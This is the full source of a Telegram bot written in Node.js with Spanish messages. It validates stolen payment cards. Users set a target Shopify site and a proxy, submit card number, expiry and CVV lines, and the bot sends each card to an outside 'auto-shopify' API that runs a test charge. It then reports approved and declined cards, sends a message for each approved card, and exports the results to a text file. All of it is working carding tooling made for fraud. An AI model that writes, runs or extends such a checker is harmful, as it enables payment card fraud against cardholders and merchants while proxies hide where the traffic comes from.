require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = Number(process.env.OWNER_ID);
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================== DATA ================== */
const DATA_FILE = './data.json';
let data = {};

if (fs.existsSync(DATA_FILE)) {
  data = JSON.parse(fs.readFileSync(DATA_FILE));
} else {
  fs.writeFileSync(DATA_FILE, JSON.stringify({}, null, 2));
}

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  return id === OWNER_ID;
}

/* ================== RUNTIME ================== */
const running = {}; // chatId => true/false

/* ================== START ================== */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 Bot activo

Configura:
• /setsite https://site.com
• /setproxy ip:port:user:pass

Usa:
• /chk cc|mm|yy|cvv (uno o varios)
• /stop

ℹ️ Se muestra progreso y se exporta TXT`
  );
});

/* ================== CONFIG ================== */
bot.onText(/\/setsite (.+)/, (msg, match) => {
  const id = msg.chat.id;
  data[id] = data[id] || {};
  data[id].site = match[1].trim();
  saveData();
  bot.sendMessage(id, `✅ Site guardado`);
});

bot.onText(/\/setproxy (.+)/, (msg, match) => {
  const id = msg.chat.id;
  data[id] = data[id] || {};
  data[id].proxy = match[1].trim();
  saveData();
  bot.sendMessage(id, `✅ Proxy guardado`);
});

/* ================== STOP ================== */
bot.onText(/\/stop/, (msg) => {
  running[msg.chat.id] = false;
  bot.sendMessage(msg.chat.id, '🛑 Proceso detenido');
});

/* ================== CHK ================== */
bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const conf = data[chatId];

  if (!conf || !conf.site || !conf.proxy) {
    return bot.sendMessage(chatId, '❌ Usa /setsite y /setproxy primero');
  }

  const input = match[1].trim();
  if (!input) return bot.sendMessage(chatId, '❌ No enviaste datos');

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);

  running[chatId] = true;

  let ok = 0, bad = 0, err = 0;
  let results = [];

  const progressMsg = await bot.sendMessage(
    chatId,
    `⏳ Iniciando...\nTotal: ${ccs.length}`
  );

  for (let i = 0; i < ccs.length; i++) {
    if (!running[chatId]) break;

    const cc = ccs[i];
    const url =
      `${API_BASE}?site=${encodeURIComponent(conf.site)}` +
      `&cc=${encodeURIComponent(cc)}` +
      `&proxy=${encodeURIComponent(conf.proxy)}`;

    try {
      const res = await axios.get(url, { timeout: 30000 });
      const d = res.data;

      let status = 'DECLINED ❌';
      if (String(d.Response).toUpperCase().includes('APPRO')) {
        status = 'APPROVED ✅';
        ok++;
        bot.sendMessage(
          chatId,
`━━━━━━━━━━━━━━
💳 ${cc}
🏪 ${d.Gateway}
💰 ${d.Price}
✅ APPROVED`
        );
      } else {
        bad++;
      }

      results.push(`${cc} | ${status} | ${d.Response}`);
    } catch (e) {
      err++;
      results.push(`${cc} | ERROR`);
    }

    await bot.editMessageText(
      `⏳ Progreso ${i + 1}/${ccs.length}
✅ ${ok} ❌ ${bad} ⚠️ ${err}`,
      { chat_id: chatId, message_id: progressMsg.message_id }
    );
  }

  running[chatId] = false;

  const file = `result_${Date.now()}.txt`;
  fs.writeFileSync(file, results.join('\n'));

  await bot.sendDocument(chatId, file);
  fs.unlinkSync(file);

  bot.sendMessage(
    chatId,
`✅ Finalizado
Aprobadas: ${ok}
Declinadas: ${bad}
Errores: ${err}`
  );
});

console.log('🤖 Bot iniciado correctamente');
